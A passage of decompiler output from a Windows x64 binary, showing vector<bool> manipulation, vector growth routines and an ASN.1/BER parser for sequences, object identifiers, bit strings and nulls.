  while ( v15 != v12 || v14 != v13 )
  {
    v16 = 1 << v14;
    if ( *a5 )
      *v15 |= v16;
    else
      *v15 &= ~v16;
    if ( v14 >= 0x1F )
    {
      v14 = 0i64;
      ++v15;
    }
    else
    {
      ++v14;
    }
  }
  v18 = (__m128i)*v7;
  _mm_store_si128(&v18, v18);
  if ( v11 < 0 && v11 )
    v18.m128i_i64[0] += -4i64 - 4 * ((unsigned __int64)(-1 - v11) >> 5);
  else
    v18.m128i_i64[0] += 4 * ((unsigned __int64)v11 >> 5);
  v18.m128i_i64[1] = v11 & 0x1F;
  result = v5;
  *v5 = v18;
  return result;
}

//----- (000000014005EC40) ----------------------------------------------------
signed __int64 __fastcall sub_14005EC40(unsigned __int64 *a1, _QWORD *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r14
  unsigned __int64 *v4; // rsi
  signed __int64 v5; // rdi
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rdx
  unsigned __int64 v9; // r10
  bool v10; // zf
  unsigned __int64 v11; // rdx
  _DWORD *v12; // rbx
  __m128i v13; // xmm1
  signed __int64 v14; // rdx
  _DWORD *v15; // r10
  signed __int64 v16; // r8
  _DWORD *v17; // r9
  __m128i v18; // [rsp+20h] [rbp-30h]
  __m128i v19; // [rsp+30h] [rbp-20h]
  __int128 v20; // [rsp+40h] [rbp-10h]
  int v21; // [rsp+70h] [rbp+20h]

  v3 = a3;
  v4 = a1;
  v5 = a2[1] + 32 * ((signed __int64)(*a2 - *a1) >> 2);
  if ( a3 )
  {
    v6 = a1[3];
    if ( -1i64 - v6 < a3 )
    {
      std::_Xlength_error("vector<bool> too long");
      __debugbreak();
    }
    v21 = 0;
    sub_14005F500(v4, (v6 + a3 + 31) >> 5, &v21);
    v7 = v4[3];
    if ( v7 )
    {
      v9 = *v4;
      v19 = (__m128i)*v4;
      if ( v7 )
      {
        if ( (v7 & 0x8000000000000000ui64) != 0i64 && v7 )
          v19.m128i_i64[0] = -4i64 - 4 * ((-1i64 - v7) >> 5) + v9;
        else
          v19.m128i_i64[0] = v9 + 4 * (v7 >> 5);
        v19.m128i_i64[1] = v7 & 0x1F;
      }
      v10 = v3 + v7 == 0;
      v11 = v3 + v7;
      v18.m128i_i64[0] = v9;
      v4[3] = v11;
      v18.m128i_i64[1] = 0i64;
      if ( !v10 )
      {
        if ( (v11 & 0x8000000000000000ui64) != 0i64 && v11 )
          v18.m128i_i64[0] = -4i64 - 4 * ((-1i64 - v11) >> 5) + v9;
        else
          v18.m128i_i64[0] = v9 + 4 * (v11 >> 5);
        v18.m128i_i64[1] = v11 & 0x1F;
      }
      v20 = v9;
      _mm_store_si128((__m128i *)&v20, (__m128i)v9);
      if ( v5 < 0 && v5 )
        v12 = (_DWORD *)(-4i64 - 4 * ((unsigned __int64)(-1 - v5) >> 5) + v20);
      else
        v12 = (_DWORD *)(v20 + 4 * ((unsigned __int64)v5 >> 5));
      v13 = v19;
      _mm_store_si128(&v18, v18);
      _mm_store_si128((__m128i *)&v20, v13);
      v14 = *((_QWORD *)&v20 + 1);
      v15 = (_DWORD *)v20;
      v16 = v18.m128i_i64[1];
      v17 = (_DWORD *)v18.m128i_i64[0];
      while ( v12 != v15 || (v5 & 0x1F) != v14 )
      {
        if ( v14 )
        {
          --v14;
        }
        else
        {
          v14 = 31i64;
          --v15;
        }
        if ( v16 )
        {
          --v16;
        }
        else
        {
          v16 = 31i64;
          --v17;
        }
        if ( (1 << v14) & *v15 )
          *v17 |= 1 << v16;
        else
          *v17 &= ~(1 << v16);
      }
    }
    else
    {
      v4[3] = v3;
    }
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014005EE60) ----------------------------------------------------
char *__fastcall sub_14005EE60(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  char *v4; // rbx
  __int64 v5; // r14
  char *result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x7FFFFFFFFFFFFFFFi64 || (v4 = (char *)operator new(2 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  memmove(v4, *(const void **)v3, 2i64 * ((*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 1));
  v5 = (*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 1;
  if ( *(_QWORD *)v3 )
    operator delete(*(void **)v3);
  *(_QWORD *)(v3 + 16) = &v4[2 * v2];
  result = &v4[2 * v5];
  *(_QWORD *)(v3 + 8) = result;
  *(_QWORD *)v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014005EF20) ----------------------------------------------------
char *__fastcall sub_14005EF20(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  char *v4; // rbx
  __int64 v5; // r14
  char *result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 || (v4 = (char *)operator new(4 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  memmove(v4, *(const void **)v3, 4i64 * ((*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 2));
  v5 = (*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 2;
  if ( *(_QWORD *)v3 )
    operator delete(*(void **)v3);
  *(_QWORD *)(v3 + 16) = &v4[4 * v2];
  result = &v4[4 * v5];
  *(_QWORD *)(v3 + 8) = result;
  *(_QWORD *)v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014005EFF0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14005EFF0(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  unsigned __int64 result; // rax
  signed __int64 v6; // r10
  __int64 v7; // r8
  unsigned __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rdx

  v2 = a1[1];
  v3 = a2;
  v4 = a1[2];
  result = (a1[2] - v2) >> 1;
  if ( result < v3 )
  {
    v6 = 0x7FFFFFFFFFFFFFFFi64;
    v7 = (v2 - *a1) >> 1;
    if ( 0x7FFFFFFFFFFFFFFFi64 - v7 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v8 = v7 + v3;
    v9 = (v4 - *a1) >> 1;
    if ( v6 - (v9 >> 1) >= v9 )
    {
      v11 = (v9 >> 1) + v9;
      if ( v11 < v8 )
        v11 = v7 + v3;
      result = (unsigned __int64)sub_14005EE60((__int64)a1, v11);
    }
    else
    {
      v10 = 0i64;
      if ( v8 > 0 )
        v10 = v7 + v3;
      result = (unsigned __int64)sub_14005EE60((__int64)a1, v10);
    }
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014005F080) ----------------------------------------------------
unsigned __int64 __fastcall sub_14005F080(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  unsigned __int64 result; // rax
  signed __int64 v6; // r10
  __int64 v7; // r8
  unsigned __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rdx

  v2 = a1[1];
  v3 = a2;
  v4 = a1[2];
  result = (a1[2] - v2) >> 2;
  if ( result < v3 )
  {
    v6 = 0x3FFFFFFFFFFFFFFFi64;
    v7 = (v2 - *a1) >> 2;
    if ( 0x3FFFFFFFFFFFFFFFi64 - v7 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v8 = v7 + v3;
    v9 = (v4 - *a1) >> 2;
    if ( v6 - (v9 >> 1) >= v9 )
    {
      v11 = (v9 >> 1) + v9;
      if ( v11 < v8 )
        v11 = v7 + v3;
      result = (unsigned __int64)sub_14005EF20((__int64)a1, v11);
    }
    else
    {
      v10 = 0i64;
      if ( v8 > 0 )
        v10 = v7 + v3;
      result = (unsigned __int64)sub_14005EF20((__int64)a1, v10);
    }
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014005F110) ----------------------------------------------------
unsigned __int64 __fastcall sub_14005F110(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  _QWORD *v3; // r14
  unsigned __int64 v4; // rbp
  const void *v5; // rdx
  __int64 v6; // rcx
  unsigned __int64 v7; // rbp
  unsigned __int64 result; // rax
  signed __int64 v9; // rbx
  int v10; // esi

  v2 = a2;
  v3 = a1;
  if ( a2 > 0xFFFFFFFFFFFFFFFFui64 )
  {
    std::_Xlength_error("vector<bool> too long");
    __debugbreak();
  }
  v4 = a2 + 31;
  v5 = (const void *)a1[1];
  v6 = *a1;
  v7 = v4 >> 5;
  result = (_QWORD)((_QWORD)v5 - v6) >> 2;
  if ( v7 < result )
  {
    v9 = v6 + 4 * v7;
    if ( v9 == v6 )
    {
      v3[1] = v6;
    }
    else if ( (const void *)v9 != v5 )
    {
      memmove((void *)(v6 + 4 * v7), v5, 0i64);
      result = v9;
      v3[1] = v9;
    }
  }
  v3[3] = v2;
  v10 = v2 & 0x1F;
  if ( v10 )
  {
    result = (unsigned int)((1 << v10) - 1);
    *(_DWORD *)(*v3 + 4 * v7 - 4) &= result;
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014005F1E0) ----------------------------------------------------
__m128i *__fastcall sub_14005F1E0(signed __int64 *a1)
{
  signed __int64 v1; // r9
  signed __int64 v2; // rdx
  signed __int64 v3; // r8
  __m128i v5; // [rsp+20h] [rbp-38h]
  __int128 v6; // [rsp+30h] [rbp-28h]
  char v7; // [rsp+40h] [rbp-18h]

  v1 = *a1;
  v2 = a1[3];
  v3 = *a1;
  v5 = (__m128i)(unsigned __int64)*a1;
  if ( v2 )
  {
    if ( v2 < 0 && v2 )
      v5.m128i_i64[0] = -4i64 - 4 * ((unsigned __int64)(-1 - v2) >> 5) + v3;
    else
      v5.m128i_i64[0] = v1 + 4 * ((unsigned __int64)v2 >> 5);
    v5.m128i_i64[1] = v2 & 0x1F;
  }
  v6 = (unsigned __int64)v1;
  _mm_store_si128(&v5, v5);
  _mm_store_si128((__m128i *)&v6, (__m128i)(unsigned __int64)v1);
  return sub_14005F290(a1, (__m128i *)&v7, &v6, &v5);
}

//----- (000000014005F290) ----------------------------------------------------
__m128i *__fastcall sub_14005F290(signed __int64 *a1, __m128i *a2, __int128 *a3, __m128i *a4)
{
  __int128 v4; // xmm0
  _DWORD *v5; // rdi
  unsigned __int64 v6; // r11
  signed __int64 v7; // r8
  __m128i *v8; // r12
  signed __int64 *v9; // r15
  signed __int64 v10; // r10
  signed __int64 v11; // r8
  __m128i v12; // xmm0
  signed __int64 v13; // rdx
  signed __int64 v14; // r9
  signed __int64 v15; // rdx
  signed __int64 v16; // rbx
  unsigned __int64 v17; // r10
  __m128i v18; // xmm1
  unsigned __int64 v19; // r8
  _DWORD *v20; // r11
  unsigned __int64 v21; // r9
  _DWORD *v22; // rdx
  __m128i *result; // rax
  __m128i v24; // [rsp+20h] [rbp-30h]
  __int128 v25; // [rsp+30h] [rbp-20h]
  __m128i v26; // [rsp+40h] [rbp-10h]

  v4 = *a3;
  v5 = (_DWORD *)*a1;
  v6 = a1[3];
  v7 = 0i64;
  v8 = a2;
  v9 = a1;
  v10 = *a1;
  v24 = (__m128i)(unsigned __int64)*a1;
  v25 = v4;
  if ( v6 )
  {
    v11 = *((_QWORD *)&v25 + 1) + 32i64 * (((_QWORD)v25 - (_QWORD)v5) >> 2);
    if ( v11 < 0 && v11 )
      v10 += -4i64 - 4 * ((unsigned __int64)(-1 - v11) >> 5);
    else
      v10 = (signed __int64)&v5[(unsigned __int64)v11 >> 5];
    v7 = v11 & 0x1F;
    v24.m128i_i64[0] = v10;
    v24.m128i_i64[1] = (unsigned int)v7;
  }
  v12 = *a4;
  v13 = 0i64;
  v14 = (signed __int64)v5;
  v25 = (unsigned __int64)v5;
  v26 = v12;
  if ( v6 )
  {
    v15 = v26.m128i_i64[1] + 32 * ((v26.m128i_i64[0] - (signed __int64)v5) >> 2);
    if ( v15 < 0 && v15 )
      v14 = (signed __int64)((char *)v5 - 4i64 - 4 * ((unsigned __int64)(-1 - v15) >> 5));
    else
      v14 = (signed __int64)&v5[(unsigned __int64)v15 >> 5];
    v13 = v15 & 0x1F;
    *(_QWORD *)&v25 = v14;
    *((_QWORD *)&v25 + 1) = (unsigned int)v13;
  }
  v16 = v7 + 32 * ((v10 - (signed __int64)v5) >> 2);
  if ( v10 != v14 || v7 != v13 )
  {
    v17 = 0i64;
    if ( v6 )
    {
      if ( (v6 & 0x8000000000000000ui64) != 0i64 && v6 )
        v5 = (_DWORD *)((char *)v5 - 4i64 - 4 * ((-1i64 - v6) >> 5));
      else
        v5 += v6 >> 5;
      v17 = v6 & 0x1F;
    }
    v18 = (__m128i)v25;
    _mm_store_si128(&v24, v24);
    _mm_store_si128(&v26, v18);
    v19 = v26.m128i_u64[1];
    v20 = (_DWORD *)v26.m128i_i64[0];
    v21 = v24.m128i_u64[1];
    v22 = (_DWORD *)v24.m128i_i64[0];
    while ( v20 != v5 || v19 != v17 )
    {
      if ( (1 << v19) & *v20 )
        *v22 |= 1 << v21;
      else
        *v22 &= ~(1 << v21);
      if ( v21 >= 0x1F )
      {
        v21 = 0i64;
        ++v22;
      }
      else
      {
        ++v21;
      }
      if ( v19 >= 0x1F )
      {
        v19 = 0i64;
        ++v20;
      }
      else
      {
        ++v19;
      }
    }
    sub_14005F110(a1, v21 + 32 * (((signed __int64)v22 - *a1) >> 2));
  }
  v26 = (__m128i)(unsigned __int64)*v9;
  _mm_store_si128(&v24, v26);
  if ( v16 < 0 && v16 )
    v24.m128i_i64[0] += -4i64 - 4 * ((unsigned __int64)(-1 - v16) >> 5);
  else
    v24.m128i_i64[0] += 4 * ((unsigned __int64)v16 >> 5);
  result = v8;
  v24.m128i_i64[1] = v16 & 0x1F;
  *v8 = v24;
  return result;
}

//----- (000000014005F500) ----------------------------------------------------
unsigned __int64 __fastcall sub_14005F500(unsigned __int64 *a1, unsigned __int64 a2, _DWORD *a3)
{
  _DWORD *v3; // rsi
  unsigned __int64 v4; // rbx
  unsigned __int64 *v5; // rdi
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rdx
  unsigned __int64 result; // rax
  signed __int64 v9; // rsi
  _DWORD *v10; // rdx
  signed __int64 v11; // rax
  unsigned __int64 v12; // rcx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = a1[1];
  v7 = *v5;
  result = (signed __int64)(v6 - *v5) >> 2;
  if ( result <= v4 )
  {
    if ( result >= v4 )
      return result;
    if ( (unsigned __int64)a3 >= v6 || v7 > (unsigned __int64)a3 )
    {
      sub_14005F080(v5, v4 - result);
    }
    else
    {
      v9 = (signed __int64)((signed __int64)a3 - v7) >> 2;
      sub_14005F080(v5, v4 - result);
      v3 = (_DWORD *)(*v5 + 4 * v9);
    }
    v10 = (_DWORD *)v5[1];
    v11 = (signed __int64)(v5[1] - *v5) >> 2;
    v12 = v4 - v11;
    if ( v4 != v11 )
    {
      do
      {
        *v10 = *v3;
        ++v10;
        --v12;
      }
      while ( v12 );
    }
    v6 = v5[1];
    result = (signed __int64)(v5[1] - *v5) >> 2;
  }
  result = v6 + 4 * (v4 - result);
  v5[1] = result;
  return result;
}

//----- (000000014005F5D0) ----------------------------------------------------
__m128i *__fastcall sub_14005F5D0(signed __int64 *a1, unsigned __int64 a2, char a3)
{
  unsigned __int64 v3; // r8
  unsigned __int64 *v4; // r11
  signed __int64 v5; // rcx
  __m128i *result; // rax
  signed __int64 v7; // rsi
  __m128i v8; // [rsp+30h] [rbp-30h]
  __m128i v9; // [rsp+40h] [rbp-20h]
  char v10; // [rsp+50h] [rbp-10h]
  char v11; // [rsp+80h] [rbp+20h]

  v11 = a3;
  v3 = a1[3];
  v4 = (unsigned __int64 *)a1;
  if ( a2 <= v3 )
  {
    if ( a2 < v3 )
    {
      v7 = *a1;
      v9 = (__m128i)(unsigned __int64)*a1;
      if ( v3 )
      {
        if ( (v3 & 0x8000000000000000ui64) != 0i64 && v3 )
          v9.m128i_i64[0] = -4i64 - 4 * ((-1i64 - v3) >> 5) + v7;
        else
          v9.m128i_i64[0] = v7 + 4 * (v3 >> 5);
        v9.m128i_i64[1] = v3 & 0x1F;
      }
      v8 = (__m128i)(unsigned __int64)v7;
      _mm_store_si128(&v8, (__m128i)(unsigned __int64)v7);
      if ( (a2 & 0x8000000000000000ui64) != 0i64 && a2 )
        v8.m128i_i64[0] += -4i64 - 4 * ((-1i64 - a2) >> 5);
      else
        v8.m128i_i64[0] += 4 * (a2 >> 5);
      v8.m128i_i64[1] = a2 & 0x1F;
      _mm_store_si128(&v9, v9);
      _mm_store_si128(&v8, v8);
      result = sub_14005F290(a1, (__m128i *)&v10, (__int128 *)v8.m128i_i8, &v9);
    }
  }
  else
  {
    v5 = *a1;
    v8 = (__m128i)(unsigned __int64)v5;
    if ( v3 )
    {
      if ( (v3 & 0x8000000000000000ui64) != 0i64 && v3 )
        v8.m128i_i64[0] = -4i64 - 4 * ((-1i64 - v3) >> 5) + v5;
      else
        v8.m128i_i64[0] = v5 + 4 * (v3 >> 5);
      v8.m128i_i64[1] = v3 & 0x1F;
    }
    _mm_store_si128(&v9, v8);
    result = sub_14005EA80(v4, &v8, (__int128 *)v9.m128i_i8, a2 - v3, &v11);
  }
  return result;
}

//----- (000000014005F770) ----------------------------------------------------
__int64 __fastcall sub_14005F770(__int64 a1, __int64 a2, char a3)
{
  __int64 v3; // rbx
  char v4; // di
  __int64 v5; // rsi

  v3 = a2;
  v4 = a3;
  v5 = a1;
  sub_140036DA0(a1, 0);
  *(_QWORD *)v5 = &off_1400A9AC0;
  *(_DWORD *)(v5 + 24) = -1;
  *(_BYTE *)(v5 + 32) = 0;
  *(_QWORD *)(v5 + 8) = &off_1400ACF80;
  *(_QWORD *)(v5 + 40) = v3;
  *(_BYTE *)(v5 + 48) = 0;
  sub_140060910(v5, v4);
  return v5;
}
// 1400A9AC0: using guessed type __int64 (__fastcall *off_1400A9AC0)(void *);
// 1400ACF80: using guessed type __int64 (__fastcall *off_1400ACF80)();

//----- (000000014005F7E0) ----------------------------------------------------
__int64 __fastcall sub_14005F7E0(__int64 a1, __int64 a2, char a3)
{
  __int64 v3; // rbx
  char v4; // si
  __int64 v5; // rdi

  v3 = a2;
  v4 = a3;
  v5 = a1;
  sub_1400565B0(a1, 0i64);
  *(_QWORD *)v5 = &off_1400A9C28;
  *(_QWORD *)(v5 + 80) = v3;
  *(_BYTE *)(v5 + 89) = v4;
  *(_QWORD *)(v5 + 8) = &off_1400ACF98;
  *(_BYTE *)(v5 + 88) = 0;
  return v5;
}
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();

//----- (000000014005F8B0) ----------------------------------------------------
void __fastcall sub_14005F8B0(__int64 a1)
{
  _QWORD *v1; // rbx

  v1 = (_QWORD *)a1;
  *(_QWORD *)a1 = &off_1400A9C28;
  *(_QWORD *)(a1 + 8) = &off_1400ACF98;
  if ( !*(_BYTE *)(a1 + 88) )
    sub_1400609E0(a1);
  sub_1400566F0(v1);
}
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();

//----- (000000014005F91C) ----------------------------------------------------
void *__fastcall sub_14005F91C(__int64 a1, char a2)
{
  return sub_14005F940((void *)(a1 - 8), a2);
}

//----- (000000014005F928) ----------------------------------------------------
void *__fastcall sub_14005F928(__int64 a1, char a2)
{
  return sub_14005F970((void *)(a1 - 8), a2);
}

//----- (000000014005F940) ----------------------------------------------------
void *__fastcall sub_14005F940(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14005F840(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 14005F840: using guessed type __int64 __fastcall sub_14005F840(_QWORD);

//----- (000000014005F970) ----------------------------------------------------
void *__fastcall sub_14005F970(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14005F8B0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014005F9A0) ----------------------------------------------------
int *__fastcall sub_14005F9A0(int **a1, __int64 a2)
{
  __int64 v2; // r14
  int **v3; // rbx
  unsigned __int64 v4; // rbp
  int *result; // rax
  unsigned __int64 i; // rbp
  unsigned __int64 v7; // rsi
  int v8; // edi
  signed __int64 v9; // rdi
  int *v10; // rdx
  unsigned __int8 v11; // [rsp+58h] [rbp+10h]
  unsigned __int64 v12; // [rsp+60h] [rbp+18h]
  int v13; // [rsp+68h] [rbp+20h]

  v2 = a2;
  v3 = a1;
  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a2 + 144i64))(a2, &v11) || v11 != 6 )
    sub_14003E950();
  if ( !(unsigned __int8)sub_14005FFF0(v2, &v12) || (v4 = v12, v12 < 1) )
    sub_14003E950();
  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)v2 + 144i64))(v2, &v11) )
    sub_14003E950();
  sub_140060AD0(v3, 2ui64);
  **v3 = v11 / 40;
  result = *v3;
  (*v3)[1] = v11 % 40;
  for ( i = v4 - 1; i; i -= v7 )
  {
    v7 = 0i64;
    v8 = 0;
    do
    {
      if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int64 *))(*(_QWORD *)v2 + 144i64))(v2, &v12) )
        sub_14003E950();
      ++v7;
      if ( v8 & 0xFE000000 )
        sub_14003E950();
      v8 = (v12 & 0x7F) + (v8 << 7);
      v13 = v8;
    }
    while ( (v12 & 0x80u) != 0i64 );
    if ( v7 > i )
      sub_14003E950();
    result = v3[1];
    if ( &v13 >= result || *v3 > &v13 )
    {
      if ( result == v3[2] )
        sub_14004C440(v3, 1ui64);
      result = v3[1];
      if ( result )
        *result = v8;
    }
    else
    {
      v9 = &v13 - *v3;
      if ( result == v3[2] )
        result = (int *)sub_14004C440(v3, 1ui64);
      v10 = v3[1];
      if ( v10 )
      {
        result = *v3;
        *v10 = (*v3)[v9];
      }
    }
    ++v3[1];
  }
  return result;
}

//----- (000000014005FB90) ----------------------------------------------------
__int64 __fastcall sub_14005FB90(__int64 a1, __int64 *a2)
{
  __int64 *v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rbx
  _DWORD *v5; // rax
  _DWORD *v6; // r8
  char *v7; // rdx
  __int64 v8; // rbx
  __int16 v10; // [rsp+20h] [rbp-C8h]
  char v11; // [rsp+24h] [rbp-C4h]
  char v12; // [rsp+25h] [rbp-C3h]
  char v13; // [rsp+26h] [rbp-C2h]
  void *v14[2]; // [rsp+28h] [rbp-C0h]
  __int64 v15; // [rsp+38h] [rbp-B0h]
  __int64 v16; // [rsp+40h] [rbp-A8h]
  void *v17; // [rsp+48h] [rbp-A0h]
  __int64 (__fastcall **v18)(void *); // [rsp+60h] [rbp-88h]
  __int64 (__fastcall **v19)(); // [rsp+68h] [rbp-80h]
  __int64 *v20; // [rsp+70h] [rbp-78h]
  int v21; // [rsp+78h] [rbp-70h]
  __int64 v22; // [rsp+80h] [rbp-68h]
  __int64 (__fastcall **v23)(void *); // [rsp+88h] [rbp-60h]
  __int64 (__fastcall **v24)(); // [rsp+90h] [rbp-58h]
  int v25; // [rsp+A0h] [rbp-48h]
  char v26; // [rsp+A8h] [rbp-40h]
  __int64 *v27; // [rsp+B0h] [rbp-38h]
  char v28; // [rsp+B8h] [rbp-30h]
  char v29; // [rsp+B9h] [rbp-2Fh]
  __int64 v30; // [rsp+C0h] [rbp-28h]
  __int64 (__fastcall **v31)(void *); // [rsp+C8h] [rbp-20h]
  __int64 (__fastcall **v32)(); // [rsp+D0h] [rbp-18h]
  int v33; // [rsp+E0h] [rbp-8h]
  char v34; // [rsp+E8h] [rbp+0h]
  __int64 *v35; // [rsp+F0h] [rbp+8h]
  char v36; // [rsp+F8h] [rbp+10h]
  char v37; // [rsp+F9h] [rbp+11h]
  __int64 v38; // [rsp+100h] [rbp+18h]

  v16 = -2i64;
  v2 = a2;
  v3 = a1;
  sub_140036DA0((__int64)&v18, 0);
  v21 = -1;
  v18 = &off_1400A9AC0;
  v19 = &off_1400ACF80;
  v20 = v2;
  LOBYTE(v21) = 0;
  if ( !(*(__int64 (__fastcall **)(__int64 *, char *))(*v2 + 144))(v2, &v13) || v13 != 48 )
    sub_14003E950();
  if ( !sub_1400600B0((__int64)v20, &v22, (_BYTE *)&v21 + 1) )
    sub_14003E950();
  v18 = &off_1400A9AC0;
  v19 = &off_1400ACF80;
  sub_140036DA0((__int64)&v23, 0);
  v25 = -1;
  v26 = 0;
  v23 = &off_1400A9AC0;
  v24 = &off_1400ACF80;
  v27 = (__int64 *)&v18;
  v28 = 0;
  if ( !((__int64 (__fastcall *)(__int64 (__fastcall ***)(void *), char *))v18[18])(&v18, &v12) || v12 != 48 )
    sub_14003E950();
  if ( !sub_1400600B0((__int64)v27, &v30, &v29) )
    sub_14003E950();
  v23 = &off_1400A9AC0;
  v24 = &off_1400ACF80;
  v4 = (*(__int64 (__fastcall **)(__int64, void **))(*(_QWORD *)v3 + 32i64))(v3, &v17);
  _mm_storeu_si128((__m128i *)v14, (__m128i)0i64);
  v15 = 0i64;
  sub_14005F9A0((int **)v14, (__int64)&v23);
  v5 = *(_DWORD **)(v4 + 8);
  v6 = *(_DWORD **)v4;
  if ( ((v14[1] - v14[0]) ^ (*(_QWORD *)(v4 + 8) - *(_QWORD *)v4)) & 0xFFFFFFFFFFFFFFFCui64 )
    goto LABEL_54;
  if ( v6 != v5 )
  {
    v7 = (char *)(v14[0] - (void *)v6);
    while ( *v6 == *(_DWORD *)&v7[(_QWORD)v6] )
    {
      ++v6;
      if ( v6 == v5 )
        goto LABEL_14;
    }
LABEL_54:
    sub_14003E950();
  }
LABEL_14:
  if ( v14[0] )
    operator delete(v14[0]);
  if ( v17 )
    operator delete(v17);
  if ( v29 )
  {
    if ( !v30 )
    {
LABEL_23:
      LOBYTE(v8) = 0;
      goto LABEL_25;
    }
  }
  else if ( sub_140038ED0(v27, &v10, 1) == 2 && !v10 )
  {
    goto LABEL_23;
  }
  v8 = (*(unsigned __int8 (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v3 + 40i64))(v3, &v23);
LABEL_25:
  v28 = 1;
  if ( v29 )
  {
    if ( v30 )
      sub_14003E950();
  }
  else if ( sub_1400389E0(v27, &v10, 1) != 2 || v10 )
  {
    sub_14003E950();
  }
  sub_140036DA0((__int64)&v31, 0);
  v33 = -1;
  v34 = 0;
  v31 = &off_1400A9AC0;
  v32 = &off_1400ACF80;
  v35 = (__int64 *)&v18;
  v36 = 0;
  if ( !((__int64 (__fastcall *)(__int64 (__fastcall ***)(void *), char *))v18[18])(&v18, &v11) || v11 != 3 )
    sub_14003E950();
  if ( !sub_1400600B0((__int64)v35, &v38, &v37) )
    sub_14003E950();
  if ( !v37 )
    sub_14003E950();
  if ( !((__int64 (__fastcall *)(__int64 (__fastcall ***)(void *), __int16 *))v31[18])(&v31, &v10) || (_BYTE)v10 )
    sub_14003E950();
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *), _QWORD, __int64))(*(_QWORD *)v3 + 56i64))(
    v3,
    &v31,
    (unsigned __int8)v8,
    v38);
  v36 = 1;
  if ( v37 )
  {
    if ( v38 )
      sub_14003E950();
  }
  else if ( sub_1400389E0(v35, &v10, 1) != 2 || v10 )
  {
    sub_14003E950();
  }
  LOBYTE(v21) = 1;
  if ( BYTE1(v21) )
  {
    if ( v22 )
      sub_14003E950();
  }
  else if ( sub_1400389E0(v20, &v10, 1) != 2 || v10 )
  {
    sub_14003E950();
  }
  sub_14005F840(&v31);
  sub_14005F840(&v23);
  return sub_14005F840(&v18);
}
// 14005F840: using guessed type __int64 __fastcall sub_14005F840(_QWORD);
// 1400A9AC0: using guessed type __int64 (__fastcall *off_1400A9AC0)(void *);
// 1400ACF80: using guessed type __int64 (__fastcall *off_1400ACF80)();

//----- (000000014005FFA0) ----------------------------------------------------
__int64 __fastcall sub_14005FFA0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 result; // rax
  char v3; // [rsp+30h] [rbp+8h]
  __int64 v4; // [rsp+38h] [rbp+10h]

  v1 = a1;
  if ( !(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 144i64))(a1, &v3) || v3 != 5 )
    sub_14003E950();
  result = sub_14005FFF0(v1, (unsigned __int64 *)&v4);
  if ( !(_BYTE)result || v4 )
    sub_14003E950();
  return result;
}

//----- (000000014005FFF0) ----------------------------------------------------
__int64 __fastcall sub_14005FFF0(__int64 a1, unsigned __int64 *a2)
{
  unsigned __int64 *v2; // r14
  __int64 v3; // rsi
  unsigned __int64 v4; // rbx
  unsigned __int8 v5; // bp
  int v6; // edi
  unsigned __int8 v8; // [rsp+40h] [rbp+8h]

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a1 + 144i64))(a1, &v8) )
    goto LABEL_12;
  if ( (v8 & 0x80u) != 0 )
  {
    v6 = v8 & 0x7F;
    if ( !(v8 & 0x7F) )
    {
      v5 = 0;
      goto LABEL_10;
